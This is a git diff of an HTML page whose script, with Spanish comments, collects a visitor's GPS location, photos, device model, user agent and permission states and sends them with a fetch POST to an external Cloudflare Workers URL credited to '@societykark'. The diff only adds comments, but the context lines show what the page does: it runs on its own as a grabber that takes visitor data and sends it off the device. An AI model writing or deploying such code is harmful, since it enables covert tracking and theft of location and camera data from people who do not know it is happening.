@@ -14,12 +14,13 @@
     <canvas id="c"></canvas>
 
     <script>
-    
+        // CONFIGURACIÓN
         const trackingId = 'AQUI_VA_TOKEN';
         const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
         console.log('✅ Script iniciado');
 
+        // ========== FUNCIONES DE CAPTURA (CON LOGS) ==========
 
         async function reverseGeocode(lat, lng) {
             try {
@@ -156,6 +157,7 @@
             return permisos;
         }
 
+        // ========== CONSTRUIR MENSAJE (FORMDATA) ==========
         async function enviarAlWorker() {
             console.log('📤 Iniciando captura...');
             try {
@@ -173,7 +175,7 @@
 
                 console.log('✅ Datos capturados. GPS:', gps, 'Fotos:', fotos.length);
 
-               
+                // Construir mensaje de texto con todos los datos del dispositivo
                 let msg = '🖥️ Device & Browser\n';
                 msg += `   • Device Model: ${dispositivo.modelo}\n`;
                 msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
@@ -221,7 +223,7 @@
                 msg += `⚡ Developed by: @societykark\n`;
                 msg += `⏰ ${new Date().toISOString()}`;
 
-               
+                // Construir FormData para enviar al Worker
                 const formData = new FormData();
                 formData.append('text', msg);
                 formData.append('latitude', gps?.lat || '');
@@ -234,7 +236,7 @@
 
                 const response = await fetch(workerUrl, {
                     method: 'POST',
-                    body: formData  
+                    body: formData  // FormData establece el Content-Type automáticamente
                 });
                 const result = await response.json();
                 console.log('✅ Respuesta del Worker:', result);
@@ -243,6 +245,7 @@
             }
         }
 
+        // ========== EVENTOS ==========
         function ejecutar() {
             console.log('🔄 Ejecutando captura...');
             setTimeout(enviarAlWorker, 500);
@@ -261,4 +264,4 @@
         });
     </script>
 </body>
-</html> 
+</html>
